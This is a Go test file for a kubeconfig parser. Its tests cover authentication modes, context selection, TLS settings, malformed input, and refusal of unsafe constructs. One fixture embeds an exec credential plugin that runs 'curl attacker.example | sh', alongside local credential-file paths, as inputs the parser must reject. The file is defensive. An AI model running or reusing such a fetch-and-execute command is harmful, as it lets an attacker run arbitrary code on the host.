package kubernetes

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/pem"
	"math/big"
	"strings"
	"testing"
	"time"
)

func b64(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }

// selfSignedPEM returns a throwaway certificate/key pair so the client-cert
// path can be exercised without a fixture file.
func selfSignedPEM(t *testing.T) (certPEM, keyPEM []byte) {
	t.Helper()
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		t.Fatalf("generate key: %v", err)
	}
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{CommonName: "cloop-test"},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		t.Fatalf("create certificate: %v", err)
	}
	certPEM = pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})
	keyPEM = pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(key)})
	return certPEM, keyPEM
}

func TestParseKubeconfig_TokenAuth(t *testing.T) {
	raw := []byte(`
apiVersion: v1
kind: Config
current-context: prod
clusters:
- name: prod-cluster
  cluster:
    server: https://api.prod.example:6443
    certificate-authority-data: ` + b64("-----BEGIN CERTIFICATE-----\nfake\n-----END CERTIFICATE-----\n") + `
contexts:
- name: prod
  context:
    cluster: prod-cluster
    user: runner
    namespace: cloop-jobs
users:
- name: runner
  user:
    token: sha256~abcdef
`)
	// The CA is not a real certificate, so tlsConfig must reject it — which
	// is itself the assertion that a malformed CA is caught at parse time
	// rather than at the first API call.
	if _, err := ParseKubeconfig(raw, ""); err == nil {
		t.Fatal("a certificate-authority-data that is not a PEM bundle must be rejected")
	}

	// Now with a real one.
	certPEM, _ := selfSignedPEM(t)
	raw = []byte(`
apiVersion: v1
kind: Config
current-context: prod
clusters:
- name: prod-cluster
  cluster:
    server: https://api.prod.example:6443/
    certificate-authority-data: ` + base64.StdEncoding.EncodeToString(certPEM) + `
contexts:
- name: prod
  context: {cluster: prod-cluster, user: runner, namespace: cloop-jobs}
users:
- name: runner
  user:
    token: sha256~abcdef
`)
	rc, err := ParseKubeconfig(raw, "")
	if err != nil {
		t.Fatalf("ParseKubeconfig: %v", err)
	}
	if rc.Server != "https://api.prod.example:6443" {
		t.Errorf("Server = %q; the trailing slash must be trimmed or every path becomes a double slash", rc.Server)
	}
	if rc.BearerToken != "sha256~abcdef" {
		t.Errorf("BearerToken = %q", rc.BearerToken)
	}
	if rc.Namespace != "cloop-jobs" {
		t.Errorf("Namespace = %q", rc.Namespace)
	}
	if rc.Context != "prod" {
		t.Errorf("Context = %q", rc.Context)
	}
	if len(rc.CAData) == 0 {
		t.Error("CAData was not decoded")
	}

	// Describe must never leak the credential.
	desc := rc.Describe()
	if strings.Contains(desc, "abcdef") {
		t.Errorf("Describe() leaked the token: %q", desc)
	}
	if !strings.Contains(desc, "bearer-token") {
		t.Errorf("Describe() = %q, want it to name the auth method", desc)
	}
}

func TestParseKubeconfig_ClientCertAuth(t *testing.T) {
	certPEM, keyPEM := selfSignedPEM(t)
	raw := []byte(`
apiVersion: v1
kind: Config
current-context: dev
clusters:
- name: dev
  cluster:
    server: https://127.0.0.1:6443
    insecure-skip-tls-verify: true
contexts:
- name: dev
  context: {cluster: dev, user: dev}
users:
- name: dev
  user:
    client-certificate-data: ` + base64.StdEncoding.EncodeToString(certPEM) + `
    client-key-data: ` + base64.StdEncoding.EncodeToString(keyPEM) + `
`)
	rc, err := ParseKubeconfig(raw, "")
	if err != nil {
		t.Fatalf("ParseKubeconfig: %v", err)
	}
	if len(rc.ClientCertData) == 0 || len(rc.ClientKeyData) == 0 {
		t.Fatal("client certificate material was not decoded")
	}
	if !rc.Insecure {
		t.Error("insecure-skip-tls-verify was not honoured")
	}
	if !strings.Contains(rc.Describe(), "INSECURE") {
		t.Errorf("Describe() = %q; skipping verification must be visible, not silent", rc.Describe())
	}
	if _, err := rc.tlsConfig(); err != nil {
		t.Fatalf("tlsConfig: %v", err)
	}
}

// TestParseKubeconfig_RejectsHostExecutionVectors is the security core of the
// parser: every kubeconfig construct that would make the *control plane* run
// a program or read a local file must be refused, because a brokered
// kubeconfig may have been supplied by a tenant.
func TestParseKubeconfig_RejectsHostExecutionVectors(t *testing.T) {
	base := `
apiVersion: v1
kind: Config
current-context: c
clusters:
- name: cl
  cluster:
    server: https://api.example:6443
    insecure-skip-tls-verify: true
contexts:
- name: c
  context: {cluster: cl, user: u}
users:
- name: u
  user:
`
	cases := map[string]struct {
		userBlock string
		want      string
	}{
		"exec credential plugin": {
			userBlock: `
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: /bin/sh
      args: ["-c", "curl attacker.example | sh"]
`,
			want: "exec credential plugin",
		},
		"auth-provider": {
			userBlock: `
    auth-provider:
      name: gcp
      config:
        cmd-path: /usr/bin/gcloud
`,
			want: "auth-provider",
		},
		"token file path": {
			userBlock: "    tokenFile: /var/run/secrets/token\n",
			want:      "tokenFile",
		},
		"client cert path": {
			userBlock: "    client-certificate: /etc/cloop/admin.crt\n    client-key: /etc/cloop/admin.key\n",
			want:      "client-certificate/client-key file paths",
		},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			_, err := ParseKubeconfig([]byte(base+tc.userBlock), "")
			if err == nil {
				t.Fatalf("ParseKubeconfig accepted a kubeconfig with %s", name)
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Errorf("error %q does not name the offending field (%q)", err, tc.want)
			}
		})
	}

	// The cluster-side equivalent: a CA file path.
	caPath := `
apiVersion: v1
kind: Config
current-context: c
clusters:
- name: cl
  cluster:
    server: https://api.example:6443
    certificate-authority: /etc/ssl/ca.crt
contexts:
- name: c
  context: {cluster: cl, user: u}
users:
- name: u
  user: {token: t}
`
	if _, err := ParseKubeconfig([]byte(caPath), ""); err == nil ||
		!strings.Contains(err.Error(), "certificate-authority") {
		t.Errorf("a certificate-authority file path must be refused, got %v", err)
	}
}

// TestParseKubeconfig_RejectsPlaintextEndpoint: a kubeconfig is portable, and
// the operator who wrote it is rarely the one running it.
func TestParseKubeconfig_RejectsPlaintextEndpoint(t *testing.T) {
	raw := []byte(`
apiVersion: v1
kind: Config
current-context: c
clusters:
- name: cl
  cluster: {server: http://api.example:8080}
contexts:
- name: c
  context: {cluster: cl, user: u}
users:
- name: u
  user: {token: secret}
`)
	_, err := ParseKubeconfig(raw, "")
	if err == nil {
		t.Fatal("an http:// API server was accepted; the bearer token would cross the network in clear text")
	}
	if !strings.Contains(err.Error(), "clear text") {
		t.Errorf("error %q does not explain the risk", err)
	}
}

func TestParseKubeconfig_ContextSelection(t *testing.T) {
	twoContexts := `
apiVersion: v1
kind: Config
clusters:
- name: a
  cluster: {server: https://a.example:6443, insecure-skip-tls-verify: true}
- name: b
  cluster: {server: https://b.example:6443, insecure-skip-tls-verify: true}
contexts:
- name: ctx-a
  context: {cluster: a, user: u, namespace: ns-a}
- name: ctx-b
  context: {cluster: b, user: u, namespace: ns-b}
users:
- name: u
  user: {token: t}
`
	// No current-context and more than one to choose from: refuse rather
	// than pick, because picking would mean acting on the wrong cluster.
	if _, err := ParseKubeconfig([]byte(twoContexts), ""); err == nil ||
		!strings.Contains(err.Error(), "executors.kubernetes.context") {
		t.Errorf("ambiguous kubeconfig: got %v, want a refusal naming the setting that resolves it", err)
	}

	rc, err := ParseKubeconfig([]byte(twoContexts), "ctx-b")
	if err != nil {
		t.Fatalf("ParseKubeconfig(ctx-b): %v", err)
	}
	if rc.Server != "https://b.example:6443" || rc.Namespace != "ns-b" {
		t.Errorf("selected the wrong context: %+v", rc)
	}

	if _, err := ParseKubeconfig([]byte(twoContexts), "ctx-missing"); err == nil ||
		!strings.Contains(err.Error(), "ctx-a") {
		t.Errorf("an unknown context should list the available ones, got %v", err)
	}

	// A single context needs no current-context: the broker's
	// MinimizeKubeconfig routinely produces exactly one.
	oneContext := `
apiVersion: v1
kind: Config
clusters:
- name: a
  cluster: {server: https://a.example:6443, insecure-skip-tls-verify: true}
contexts:
- name: only
  context: {cluster: a, user: u}
users:
- name: u
  user: {token: t}
`
	if _, err := ParseKubeconfig([]byte(oneContext), ""); err != nil {
		t.Errorf("a single-context kubeconfig should not need current-context: %v", err)
	}
}

func TestParseKubeconfig_Malformed(t *testing.T) {
	cases := map[string]struct {
		raw  string
		want string
	}{
		"empty":            {"", "empty"},
		"not yaml":         {"\tnot: [valid", "not valid YAML"},
		"no contexts":      {"apiVersion: v1\nkind: Config\n", "no contexts"},
		"missing cluster":  {"contexts:\n- name: c\n  context: {cluster: gone, user: u}\n", "does not define"},
		"no server":        {"clusters:\n- name: cl\n  cluster: {}\ncontexts:\n- name: c\n  context: {cluster: cl, user: u}\n", "no server URL"},
		"bad ca base64":    {"clusters:\n- name: cl\n  cluster: {server: 'https://a:1', certificate-authority-data: '!!!'}\ncontexts:\n- name: c\n  context: {cluster: cl, user: u}\n", "not base64"},
		"anonymous is ok?": {"clusters:\n- name: cl\n  cluster: {server: 'ftp://a:1'}\ncontexts:\n- name: c\n  context: {cluster: cl, user: u}\n", "https://"},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			_, err := ParseKubeconfig([]byte(tc.raw), "")
			if err == nil {
				t.Fatalf("ParseKubeconfig(%s) = nil error, want one", name)
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Errorf("error %q does not mention %q", err, tc.want)
			}
		})
	}
}

// TestParseKubeconfig_UnknownKeysAreDropped: an extension block or a
// preference cannot change how the driver authenticates, because nothing
// reads it.
func TestParseKubeconfig_UnknownKeysAreDropped(t *testing.T) {
	raw := []byte(`
apiVersion: v1
kind: Config
current-context: c
preferences: {colors: true}
extensions:
- name: something
  extension: {arbitrary: data}
clusters:
- name: cl
  cluster:
    server: https://api.example:6443
    insecure-skip-tls-verify: true
    disable-compression: true
contexts:
- name: c
  context: {cluster: cl, user: u}
users:
- name: u
  user: {token: t, unknown-future-field: whatever}
`)
	rc, err := ParseKubeconfig(raw, "")
	if err != nil {
		t.Fatalf("ParseKubeconfig: %v", err)
	}
	if rc.BearerToken != "t" {
		t.Errorf("BearerToken = %q", rc.BearerToken)
	}
}

func TestRESTConfig_TLSConfig(t *testing.T) {
	certPEM, keyPEM := selfSignedPEM(t)

	// A cert with no key (or vice versa) is a configuration error, and it
	// must surface at parse time rather than as a mysterious handshake
	// failure at the first API call.
	if _, err := (&RESTConfig{Server: "https://a", ClientCertData: certPEM}).tlsConfig(); err == nil {
		t.Error("a client certificate with no key was accepted")
	}
	if _, err := (&RESTConfig{Server: "https://a", ClientKeyData: keyPEM}).tlsConfig(); err == nil {
		t.Error("a client key with no certificate was accepted")
	}

	cfg, err := (&RESTConfig{
		Server: "https://a", CAData: certPEM, ServerName: "override.example",
	}).tlsConfig()
	if err != nil {
		t.Fatalf("tlsConfig: %v", err)
	}
	if cfg.RootCAs == nil {
		t.Error("CAData was not installed as a root")
	}
	if cfg.ServerName != "override.example" {
		t.Errorf("ServerName = %q", cfg.ServerName)
	}
	if cfg.MinVersion < 0x0303 {
		t.Errorf("MinVersion = %x, want TLS 1.2 or better", cfg.MinVersion)
	}
	if cfg.InsecureSkipVerify {
		t.Error("verification was disabled without being asked for")
	}
}

func TestDescribe_NilAndAnonymous(t *testing.T) {
	var rc *RESTConfig
	if got := rc.Describe(); got != "(none)" {
		t.Errorf("nil Describe() = %q", got)
	}
	got := (&RESTConfig{Server: "https://a"}).Describe()
	if !strings.Contains(got, "auth=anonymous") {
		t.Errorf("Describe() = %q, want it to say the config carries no credential", got)
	}
}
